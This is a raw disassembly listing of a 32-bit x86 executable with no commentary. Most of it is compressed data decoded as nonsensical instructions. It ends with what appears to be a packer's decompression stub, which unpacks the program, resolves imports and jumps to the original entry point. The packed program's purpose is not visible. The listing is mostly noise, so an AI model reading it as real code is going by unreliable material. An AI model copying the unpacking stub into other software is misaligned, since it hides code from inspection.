  4192f2:	93 
  4192f3:	54                   	push   %esp
  4192f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4192f5:	f0 42                	lock inc %edx
  4192f7:	79 74                	jns    0x41936d
  4192f9:	db b0 96 cc 2e 0a    	(bad) 0xa2ecc96(%eax)
  4192ff:	15 1f 14 6c f6       	adc    $0xf66c141f,%eax
  419304:	d9 ad 05 94 c9 6e    	fldcw  0x6ec99405(%ebp)
  41930a:	41                   	inc    %ecx
  41930b:	09 63 70             	or     %esp,0x70(%ebx)
  41930e:	79 0a                	jns    0x41931a
  419310:	1b 82 7a 03 41 62    	sbb    0x6241037a(%edx),%eax
  419316:	93                   	xchg   %eax,%ebx
  419317:	62 72 10             	bound  %esi,0x10(%edx)
  41931a:	a1 a9 8a 61 84       	mov    0x84618aa9,%eax
  41931f:	41                   	inc    %ecx
  419320:	0a 40 11             	or     0x11(%eax),%al
  419323:	1b 9b 03 7b 65 10    	sbb    0x10657b03(%ebx),%ebx
  419329:	3d 7b 41 33 cb       	cmp    $0xcb33417b,%eax
  41932e:	7b fd                	jnp    0x41932d
  419330:	21 50 72             	and    %edx,0x72(%eax)
  419333:	8a 58 0b             	mov    0xb(%eax),%bl
  419336:	be 1c 41 64 64       	mov    $0x6464411c,%esi
  41933b:	72 fd                	jb     0x41933a
  41933d:	0f 06                	clts
  41933f:	50                   	push   %eax
  419340:	5b                   	pop    %ebx
  419341:	21 88 7a 65 20 81    	and    %ecx,-0x7edf9a86(%eax)
  419347:	21 02                	and    %eax,(%edx)
  419349:	36 41                	ss inc %ecx
  41934b:	11 80 6c f6 22 54    	adc    %eax,0x5422f66c(%eax)
  419351:	c5 13                	lds    (%ebx),%edx
  419353:	51                   	push   %ecx
  419354:	45                   	inc    %ebp
  419355:	10 24 0a             	adc    %ah,(%edx,%ecx,1)
  419358:	b8 4c fc 7b 6f       	mov    $0x6f7bfc4c,%eax
  41935d:	73 9f                	jae    0x4192fe
  41935f:	80 6f 6d 6d          	subb   $0x6d,0x6d(%edi)
  419363:	40                   	inc    %eax
  419364:	8b 6e 2e             	mov    0x2e(%esi),%ebp
  419367:	ff 96 b6 15 c2 05    	call   *0x5c215b6(%esi)
  41936d:	0c a3                	or     $0xa3,%al
  41936f:	03 72 2d             	add    0x2d(%edx),%esi
  419372:	e6 16                	out    %al,$0x16
  419374:	ce                   	into
  419375:	be 4f 41 0f 43       	mov    $0x430f414f,%esi
  41937a:	14 73                	adc    $0x73,%al
  41937c:	9d                   	popf
  41937d:	b3 7b                	mov    $0x7b,%bl
  41937f:	86 b1 d8 69 8d 89    	xchg   %dh,-0x76729628(%ecx)
  419385:	57                   	push   %edi
  419386:	65 73 17             	gs jae 0x4193a0
  419389:	b0 aa                	mov    $0xaa,%al
  41938b:	18 bb 55 6e 68 8d    	sbb    %bh,-0x729791ab(%ebx)
  419391:	64 59                	fs pop %ecx
  419393:	62 05 d7 dc 17 1c    	bound  %eax,0x1c17dcd7
  419399:	6a 82                	push   $0xffffff82
  41939b:	46                   	inc    %esi
  41939c:	21 36                	and    %esi,(%esi)
  41939e:	ab                   	stos   %eax,%es:(%edi)
  41939f:	02 0e                	add    (%esi),%cl
  4193a1:	0f bd fb             	bsr    %ebx,%edi
  4193a4:	ac                   	lods   %ds:(%esi),%al
  4193a5:	05 45 52 37 52       	add    $0x52375245,%eax
  4193aa:	74 6c                	je     0x419418
  4193ac:	3a 0e                	cmp    (%esi),%cl
  4193ae:	66 70 6e             	data16 jo 0x41941f
  4193b1:	77 5f                	ja     0x419412
  4193b3:	0a 04 14             	or     (%esp,%edx,1),%al
  4193b6:	61                   	popa
  4193b7:	69 b3 41 48 d6 6b 48 	imul   $0xee641248,0x6bd64841(%ebx),%esi
  4193be:	12 64 ee 
  4193c1:	62 66 f8             	bound  %esp,-0x8(%esi)
  4193c4:	62 0d 26 53 e6 1a    	bound  %ecx,0x1ae65326
  4193ca:	6b c4 b2             	imul   $0xffffffb2,%esp,%eax
  4193cd:	3f                   	aas
  4193ce:	64 54                	fs push %esp
  4193d0:	69 6d 1b 3a 0c 05 8b 	imul   $0x8b050c3a,0x1b(%ebp),%ebp
  4193d7:	40                   	inc    %eax
  4193d8:	94                   	xchg   %eax,%esp
  4193d9:	d7                   	xlat   %ds:(%ebx)
  4193da:	c3                   	ret
  4193db:	68 9e 31 8b bf       	push   $0xbf8b319e
  4193e0:	42                   	inc    %edx
  4193e1:	88 a0 01 54 c5 a2    	mov    %ah,-0x5d3aabff(%eax)
  4193e7:	08 57 98             	or     %dl,-0x68(%edi)
  4193ea:	8f                   	(bad)
  4193eb:	1c 08                	sbb    $0x8,%al
  4193ed:	cb                   	lret
  4193ee:	48                   	dec    %eax
  4193ef:	f2 0c 47             	repnz or $0x47,%al
  4193f2:	0a 71 25             	or     0x25(%ecx),%dh
  4193f5:	9c                   	pushf
  4193f6:	b1 10                	mov    $0x10,%cl
  4193f8:	54                   	push   %esp
  4193f9:	d4 16                	aam    $0x16
  4193fb:	ed                   	in     (%dx),%eax
  4193fc:	56                   	push   %esi
  4193fd:	58                   	pop    %eax
  4193fe:	b6 0a                	mov    $0xa,%dh
  419400:	61                   	popa
  419401:	46                   	inc    %esi
  419402:	70 ab                	jo     0x4193af
  419404:	6e                   	outsb  %ds:(%esi),(%dx)
  419405:	67 0e                	addr16 push %cs
  419407:	c8 88 11 15          	enter  $0x1188,$0x15
  41940b:	97                   	xchg   %eax,%edi
  41940c:	59                   	pop    %ecx
  41940d:	94                   	xchg   %eax,%esp
  41940e:	84 50 c2             	test   %dl,-0x3e(%eax)
  419411:	1f                   	pop    %ds
  419412:	14 c2                	adc    $0xc2,%al
  419414:	05 c2 98 08 f2       	add    $0xf20898c2,%eax
  419419:	a3 b3 cd b5 93       	mov    %eax,0x93b5cdb3
  41941e:	6c                   	insb   (%dx),%es:(%edi)
  41941f:	44                   	inc    %esp
  419420:	70 14                	jo     0x419436
  419422:	86 79 b9             	xchg   %bh,-0x47(%ecx)
  419425:	0a 63 42             	or     0x42(%ebx),%ah
  419428:	11 63 7e             	adc    %esp,0x7e(%ebx)
  41942b:	a8 1a                	test   $0x1a,%al
  41942d:	10 46 6d             	adc    %al,0x6d(%esi)
  419430:	b7 c0                	mov    $0xc0,%bh
  419432:	3a b0 5b 41 01 13    	cmp    0x1301415b(%eax),%dh
  419438:	62 a3 39 de 50 40    	bound  %esp,0x4050de39(%ebx)
  41943e:	71 36                	jno    0x419476
  419440:	9c                   	pushf
  419441:	74 78                	je     0x4194bb
  419443:	89 8c 93 ed 41 91 11 	mov    %ecx,0x119141ed(%ebx,%edx,4)
  41944a:	6c                   	insb   (%dx),%es:(%edi)
  41944b:	36 a9 74 fc 83 c8    	ss test $0xc883fc74,%eax
  419451:	0e                   	push   %cs
  419452:	18 32                	sbb    %dh,(%edx)
  419454:	5e                   	pop    %esi
  419455:	db 26                	(bad) (%esi)
  419457:	44                   	inc    %esp
  419458:	28 44 4d 0c          	sub    %al,0xc(%ebp,%ecx,2)
  41945c:	c1 1a cd             	rcrl   $0xcd,(%edx)
  41945f:	bd 30 69 75 6d       	mov    $0x6d756930,%ebp
  419464:	43                   	inc    %ebx
  419465:	b6 4d                	mov    $0x4d,%dh
  419467:	f8                   	clc
  419468:	c2 0a 61             	ret    $0x610a
  41946b:	cd ba                	int    $0xba
  41946d:	5a                   	pop    %edx
  41946e:	9d                   	popf
  41946f:	dc b1 85 11 62 0c    	fdivl  0xc621185(%ecx)
  419475:	45                   	inc    %ebp
  419476:	76 d4                	jbe    0x41944c
  419478:	88 18                	mov    %bl,(%eax)
  41947a:	08 c9                	or     %cl,%cl
  41947c:	0d 7a 0a a5 61       	or     $0x61a50a7a,%eax
  419481:	86 3e                	xchg   %bh,(%esi)
  419483:	2a 7c 08 32          	sub    0x32(%eax,%ecx,1),%bh
  419487:	22 54 d4 19          	and    0x19(%esp,%edx,8),%dl
  41948b:	5c                   	pop    %esp
  41948c:	9d                   	popf
  41948d:	68 c5 e9 38 99       	push   $0x9938e9c5
  419492:	48                   	dec    %eax
  419493:	70 e2                	jo     0x419477
  419495:	ea 1d 62 c4 24 92 ae 	ljmp   $0xae92,$0x24c4621d
  41949c:	11 2b                	adc    %ebp,(%ebx)
  41949e:	44                   	inc    %esp
  41949f:	e1 22                	loope  0x4194c3
  4194a1:	51                   	push   %ecx
  4194a2:	84 0e                	test   %cl,(%esi)
  4194a4:	c8 99 8b 0d          	enter  $0x8b99,$0xd
  4194a8:	39 0f                	cmp    %ecx,(%edi)
  4194aa:	36 b8 02 ec 0d 23    	ss mov $0x230dec02,%eax
  4194b0:	d4 25                	aam    $0x25
  4194b2:	46                   	inc    %esi
  4194b3:	60                   	pusha
  4194b4:	b3 77                	mov    $0x77,%bl
  4194b6:	7e 46                	jle    0x4194fe
  4194b8:	6c                   	insb   (%dx),%es:(%edi)
  4194b9:	75 73                	jne    0x41952e
  4194bb:	68 0c ba 64 00       	push   $0x64ba0c
  4194c0:	82 d3 4c             	adc    $0x4c,%bl
  4194c3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4194c4:	80 b9 53 73 4d 65 f3 	cmpb   $0xf3,0x654d7353(%ecx)
  4194cb:	c0 6f 58 6d          	shrb   $0x6d,0x58(%edi)
  4194cf:	59                   	pop    %ecx
  4194d0:	eb 96                	jmp    0x419468
  4194d2:	14 e8                	adc    $0xe8,%al
  4194d4:	49                   	dec    %ecx
  4194d5:	cb                   	lret
  4194d6:	0f d5 6b 67          	pmullw 0x67(%ebx),%mm5
  4194da:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4194db:	03 19                	add    (%ecx),%ebx
  4194dd:	a8 f0                	test   $0xf0,%al
  4194df:	4c                   	dec    %esp
  4194e0:	7a 0d                	jp     0x4194ef
  4194e2:	b5 d8                	mov    $0xd8,%ch
  4194e4:	ec                   	in     (%dx),%al
  4194e5:	11 10                	adc    %edx,(%eax)
  4194e7:	11 0e                	adc    %ecx,(%esi)
  4194e9:	68 5b d8 c2 22       	push   $0x22c2d85b
  4194ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4194ef:	23 12                	and    (%edx),%edx
  4194f1:	80 b6 73 9c 66 b3 5c 	xorb   $0x5c,-0x4c99638d(%esi)
  4194f8:	2d 91 62 6f 59       	sub    $0x596f6291,%eax
  4194fd:	48                   	dec    %eax
  4194fe:	c2 04 de             	ret    $0xde04
  419501:	64 7e 59             	fs jle 0x41955d
  419504:	50                   	push   %eax
  419505:	e1 07                	loope  0x41950e
  419507:	de c1                	faddp  %st,%st(1)
  419509:	3a 42 6f             	cmp    0x6f(%edx),%al
  41950c:	c1 98 4e 65 78 95 c2 	rcrl   $0xc2,-0x6a879ab2(%eax)
  419513:	42                   	inc    %edx
  419514:	f6 98 3e 60 02 01    	negb   0x102603e(%eax)
  41951a:	20 3a                	and    %bh,(%edx)
  41951c:	87 5d 4b             	xchg   %ebx,0x4b(%ebp)
  41951f:	56                   	push   %esi
  419520:	52                   	push   %edx
  419521:	22 12                	and    (%edx),%dl
  419523:	63 73 fc             	arpl   %esi,-0x4(%ebx)
  419526:	67 30 69 03          	xor    %ch,0x3(%bx,%di)
  41952a:	be 6f 79 4d ca       	mov    $0xca4d796f,%esi
  41952f:	50                   	push   %eax
  419530:	08 01                	or     %al,(%ecx)
  419532:	fd                   	std
  419533:	97                   	xchg   %eax,%edi
  419534:	45                   	inc    %ebp
  419535:	4c                   	dec    %esp
  419536:	01 08                	add    %ecx,(%eax)
  419538:	00 19                	add    %bl,(%ecx)
  41953a:	5e                   	pop    %esi
  41953b:	42                   	inc    %edx
  41953c:	2a 3e                	sub    (%esi),%bh
  41953e:	ee                   	out    %al,(%dx)
  41953f:	c8 f2 7f 00          	enter  $0x7ff2,$0x0
  419543:	8f 81 0b 01 02 19    	pop    0x1902010b(%ecx)
  419549:	00 d4                	add    %dl,%ah
  41954b:	36 74 e2             	ss je  0x419530
  41954e:	04 25                	add    $0x25,%al
  419550:	3a fb                	cmp    %bl,%bh
  419552:	ba 10 03 f0 0d       	mov    $0xdf00310,%edx
  419557:	40                   	inc    %eax
  419558:	0b 02                	or     (%edx),%eax
  41955a:	3a 19                	cmp    (%ecx),%bl
  41955c:	16                   	push   %ss
  41955d:	02 05 4a 54 0c 76    	add    0x760c544a,%al
  419563:	e6 92                	out    %al,$0x92
  419565:	0c 1e                	or     $0x1e,%al
  419567:	34 40                	xor    $0x40,%al
  419569:	07                   	pop    %es
  41956a:	10 ef                	adc    %ch,%bh
  41956c:	72 96                	jb     0x419504
  41956e:	ec                   	in     (%dx),%al
  41956f:	06                   	push   %es
  419570:	2f                   	das
  419571:	10 f8                	adc    %bh,%al
  419573:	09 cc                	or     %ecx,%esp
  419575:	f2 03 48 74          	repnz add 0x74(%eax),%ecx
  419579:	37                   	aaa
  41957a:	12 c6                	adc    %dh,%al
  41957c:	40                   	inc    %eax
  41957d:	01 00                	add    %eax,(%eax)
  41957f:	cc                   	int3
  419580:	11 1f                	adc    %ebx,(%edi)
  419582:	20 f9                	and    %bh,%cl
  419584:	40                   	inc    %eax
  419585:	30 01                	xor    %al,(%ecx)
  419587:	00 18                	add    %bl,(%eax)
  419589:	43                   	inc    %ebx
  41958a:	4f                   	dec    %edi
  41958b:	44                   	inc    %esp
  41958c:	45                   	inc    %ebp
  41958d:	85 7d c1             	test   %edi,-0x3f(%ebp)
  419590:	9e                   	sahf
  419591:	00 d2                	add    %dl,%dl
  419593:	90                   	nop
  419594:	eb 04                	jmp    0x41959a
  419596:	23 37                	and    (%edi),%esi
  419598:	d8 e7                	fsub   %st(7),%st
  41959a:	dd 20                	frstor (%eax)
  41959c:	95                   	xchg   %eax,%ebp
  41959d:	44                   	inc    %esp
  41959e:	41                   	inc    %ecx
  41959f:	54                   	push   %esp
  4195a0:	41                   	inc    %ecx
  4195a1:	34 05                	xor    $0x5,%al
  4195a3:	fb                   	sti
  4195a4:	06                   	push   %es
  4195a5:	a2 8e 7c 0b 49       	mov    %al,0x490b7c8e
  4195aa:	d8 76 c0             	fdivs  -0x40(%esi)
  4195ad:	42                   	inc    %edx
  4195ae:	53                   	push   %ebx
  4195af:	53                   	push   %ebx
  4195b0:	59                   	pop    %ecx
  4195b1:	06                   	push   %es
  4195b2:	c4 29                	les    (%ecx),%ebp
  4195b4:	39 79 01             	cmp    %edi,0x1(%ecx)
  4195b7:	de c0                	faddp  %st,%st(0)
  4195b9:	2e 49                	cs dec %ecx
  4195bb:	77 76                	ja     0x419633
  4195bd:	a3 5f 92 61 00       	mov    %eax,0x61925f
  4195c2:	f3 10 27             	repz adc %ah,(%edi)
  4195c5:	0a e4                	or     %ah,%ah
  4195c7:	db e0                	fneni(8087 only)
  4195c9:	5c                   	pop    %esp
  4195ca:	40                   	inc    %eax
  4195cb:	4f                   	dec    %edi
  4195cc:	73 88                	jae    0x419556
  4195ce:	0c c9                	or     $0xc9,%al
  4195d0:	00 32                	add    %dh,(%edx)
  4195d2:	58                   	pop    %eax
  4195d3:	4f                   	dec    %edi
  4195d4:	e8 72 cb 95 34       	call   0x34d7614b
  4195d9:	df 18                	fistps (%eax)
  4195db:	27                   	daa
  4195dc:	30 02                	xor    %al,(%edx)
  4195de:	40                   	inc    %eax
  4195df:	50                   	push   %eax
  4195e0:	84 13                	test   %dl,(%ebx)
  4195e2:	1e                   	push   %ds
  4195e3:	2c 65                	sub    $0x65,%al
  4195e5:	02 4b 40             	add    0x40(%ebx),%cl
  4195e8:	6b 3c f7 00          	imul   $0x0,(%edi,%esi,8),%edi
  4195ec:	1b ea                	sbb    %edx,%ebp
  4195ee:	27                   	daa
  4195ef:	73 72                	jae    0x419663
  4195f1:	26 1f                	es pop %ds
  4195f3:	61                   	popa
  4195f4:	5a                   	pop    %edx
  4195f5:	d9 25 93 fc 27 d8    	fldenv 0xd827fc93
  4195fb:	00 00                	add    %al,(%eax)
  4195fd:	f8                   	clc
  4195fe:	b7 13                	mov    $0x13,%bh
  419600:	12 97 cb 76 01 00    	adc    0x176cb(%edi),%dl
  419606:	24 00                	and    $0x0,%al
  419608:	00 00                	add    %al,(%eax)
  41960a:	ff 00                	incl   (%eax)
  41960c:	00 00                	add    %al,(%eax)
  41960e:	00 00                	add    %al,(%eax)
  419610:	60                   	pusha
  419611:	be 00 20 41 00       	mov    $0x412000,%esi
  419616:	8d be 00 f0 fe ff    	lea    -0x11000(%esi),%edi
  41961c:	57                   	push   %edi
  41961d:	83 cd ff             	or     $0xffffffff,%ebp
  419620:	eb 10                	jmp    0x419632
  419622:	90                   	nop
  419623:	90                   	nop
  419624:	90                   	nop
  419625:	90                   	nop
  419626:	90                   	nop
  419627:	90                   	nop
  419628:	8a 06                	mov    (%esi),%al
  41962a:	46                   	inc    %esi
  41962b:	88 07                	mov    %al,(%edi)
  41962d:	47                   	inc    %edi
  41962e:	01 db                	add    %ebx,%ebx
  419630:	75 07                	jne    0x419639
  419632:	8b 1e                	mov    (%esi),%ebx
  419634:	83 ee fc             	sub    $0xfffffffc,%esi
  419637:	11 db                	adc    %ebx,%ebx
  419639:	72 ed                	jb     0x419628
  41963b:	9c                   	pushf
  41963c:	31 c0                	xor    %eax,%eax
  41963e:	40                   	inc    %eax
  41963f:	9d                   	popf
  419640:	01 db                	add    %ebx,%ebx
  419642:	75 07                	jne    0x41964b
  419644:	8b 1e                	mov    (%esi),%ebx
  419646:	83 ee fc             	sub    $0xfffffffc,%esi
  419649:	11 db                	adc    %ebx,%ebx
  41964b:	11 c0                	adc    %eax,%eax
  41964d:	01 db                	add    %ebx,%ebx
  41964f:	73 ef                	jae    0x419640
  419651:	75 09                	jne    0x41965c
  419653:	8b 1e                	mov    (%esi),%ebx
  419655:	83 ee fc             	sub    $0xfffffffc,%esi
  419658:	11 db                	adc    %ebx,%ebx
  41965a:	73 e4                	jae    0x419640
  41965c:	31 c9                	xor    %ecx,%ecx
  41965e:	83 e8 03             	sub    $0x3,%eax
  419661:	72 0d                	jb     0x419670
  419663:	c1 e0 08             	shl    $0x8,%eax
  419666:	8a 06                	mov    (%esi),%al
  419668:	46                   	inc    %esi
  419669:	83 f0 ff             	xor    $0xffffffff,%eax
  41966c:	74 74                	je     0x4196e2
  41966e:	50                   	push   %eax
  41966f:	5d                   	pop    %ebp
  419670:	01 db                	add    %ebx,%ebx
  419672:	75 07                	jne    0x41967b
  419674:	8b 1e                	mov    (%esi),%ebx
  419676:	83 ee fc             	sub    $0xfffffffc,%esi
  419679:	11 db                	adc    %ebx,%ebx
  41967b:	11 c9                	adc    %ecx,%ecx
  41967d:	01 db                	add    %ebx,%ebx
  41967f:	75 07                	jne    0x419688
  419681:	8b 1e                	mov    (%esi),%ebx
  419683:	83 ee fc             	sub    $0xfffffffc,%esi
  419686:	11 db                	adc    %ebx,%ebx
  419688:	11 c9                	adc    %ecx,%ecx
  41968a:	75 20                	jne    0x4196ac
  41968c:	41                   	inc    %ecx
  41968d:	01 db                	add    %ebx,%ebx
  41968f:	75 07                	jne    0x419698
  419691:	8b 1e                	mov    (%esi),%ebx
  419693:	83 ee fc             	sub    $0xfffffffc,%esi
  419696:	11 db                	adc    %ebx,%ebx
  419698:	11 c9                	adc    %ecx,%ecx
  41969a:	01 db                	add    %ebx,%ebx
  41969c:	73 ef                	jae    0x41968d
  41969e:	75 09                	jne    0x4196a9
  4196a0:	8b 1e                	mov    (%esi),%ebx
  4196a2:	83 ee fc             	sub    $0xfffffffc,%esi
  4196a5:	11 db                	adc    %ebx,%ebx
  4196a7:	73 e4                	jae    0x41968d
  4196a9:	83 c1 02             	add    $0x2,%ecx
  4196ac:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  4196b2:	83 d1 01             	adc    $0x1,%ecx
  4196b5:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  4196b8:	83 fd fc             	cmp    $0xfffffffc,%ebp
  4196bb:	76 0f                	jbe    0x4196cc
  4196bd:	8a 02                	mov    (%edx),%al
  4196bf:	42                   	inc    %edx
  4196c0:	88 07                	mov    %al,(%edi)
  4196c2:	47                   	inc    %edi
  4196c3:	49                   	dec    %ecx
  4196c4:	75 f7                	jne    0x4196bd
  4196c6:	e9 63 ff ff ff       	jmp    0x41962e
  4196cb:	90                   	nop
  4196cc:	8b 02                	mov    (%edx),%eax
  4196ce:	83 c2 04             	add    $0x4,%edx
  4196d1:	89 07                	mov    %eax,(%edi)
  4196d3:	83 c7 04             	add    $0x4,%edi
  4196d6:	83 e9 04             	sub    $0x4,%ecx
  4196d9:	77 f1                	ja     0x4196cc
  4196db:	01 cf                	add    %ecx,%edi
  4196dd:	e9 4c ff ff ff       	jmp    0x41962e
  4196e2:	5e                   	pop    %esi
  4196e3:	56                   	push   %esi
  4196e4:	5f                   	pop    %edi
  4196e5:	b9 ce 05 00 00       	mov    $0x5ce,%ecx
  4196ea:	8a 07                	mov    (%edi),%al
  4196ec:	47                   	inc    %edi
  4196ed:	2c e8                	sub    $0xe8,%al
  4196ef:	3c 01                	cmp    $0x1,%al
  4196f1:	77 f7                	ja     0x4196ea
  4196f3:	80 3f 00             	cmpb   $0x0,(%edi)
  4196f6:	75 f2                	jne    0x4196ea
  4196f8:	8b 07                	mov    (%edi),%eax
  4196fa:	8a 5f 04             	mov    0x4(%edi),%bl
  4196fd:	66 c1 e8 08          	shr    $0x8,%ax
  419701:	c1 c0 10             	rol    $0x10,%eax
  419704:	86 c4                	xchg   %al,%ah
  419706:	29 f8                	sub    %edi,%eax
  419708:	80 eb e8             	sub    $0xe8,%bl
  41970b:	01 f0                	add    %esi,%eax
  41970d:	89 07                	mov    %eax,(%edi)
  41970f:	83 c7 05             	add    $0x5,%edi
  419712:	53                   	push   %ebx
  419713:	58                   	pop    %eax
  419714:	e2 d9                	loop   0x4196ef
  419716:	8d be 00 70 01 00    	lea    0x17000(%esi),%edi
  41971c:	8b 07                	mov    (%edi),%eax
  41971e:	09 c0                	or     %eax,%eax
  419720:	74 3c                	je     0x41975e
  419722:	8b 5f 04             	mov    0x4(%edi),%ebx
  419725:	8d 84 30 e8 91 01 00 	lea    0x191e8(%eax,%esi,1),%eax
  41972c:	01 f3                	add    %esi,%ebx
  41972e:	50                   	push   %eax
  41972f:	83 c7 08             	add    $0x8,%edi
  419732:	ff 96 4c 92 01 00    	call   *0x1924c(%esi)
  419738:	95                   	xchg   %eax,%ebp
  419739:	8a 07                	mov    (%edi),%al
  41973b:	47                   	inc    %edi
  41973c:	08 c0                	or     %al,%al
  41973e:	74 dc                	je     0x41971c
  419740:	57                   	push   %edi
  419741:	59                   	pop    %ecx
  419742:	57                   	push   %edi
  419743:	48                   	dec    %eax
  419744:	f2 ae                	repnz scas %es:(%edi),%al
  419746:	55                   	push   %ebp
  419747:	ff 96 50 92 01 00    	call   *0x19250(%esi)
  41974d:	85 c0                	test   %eax,%eax
  41974f:	74 07                	je     0x419758
  419751:	89 03                	mov    %eax,(%ebx)
  419753:	83 c3 04             	add    $0x4,%ebx
  419756:	eb e1                	jmp    0x419739
  419758:	ff 96 54 92 01 00    	call   *0x19254(%esi)
  41975e:	61                   	popa
  41975f:	e9 10 4b ff ff       	jmp    0x40e274
  419764:	7c 97                	jl     0x4196fd
  419766:	41                   	inc    %ecx
  419767:	00 88 97 41 00 cc    	add    %cl,-0x33ffbe69(%eax)
  41976d:	04 41                	add    $0x41,%al
	...
